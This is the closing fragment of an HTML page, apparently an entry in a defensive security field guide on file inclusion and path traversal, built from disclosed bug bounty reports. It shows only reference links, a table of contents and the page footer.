+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/file-path-traversal" target="_blank" rel="noopener">Path traversal labs</a> (hands-on practice).</li>
+<li>All 4 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#load-sink-variants">Load-sink variants</a><a href="#classic-remote-url-include-php" style="padding-left:24px">↳ Classic remote-URL include (PHP)</a><a href="#dynamic-module-load-node-require-import" style="padding-left:24px">↳ Dynamic module load (Node require/import)</a><a href="#url-fetch-proxy-renderer" style="padding-left:24px">↳ URL-fetch proxy / renderer</a><a href="#media-library-file-embed-image-processors" style="padding-left:24px">↳ Media-library file embed (image processors)</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (4)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/file-path-traversal" target="_blank" rel="noopener">⚑ PortSwigger: Path traversal</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
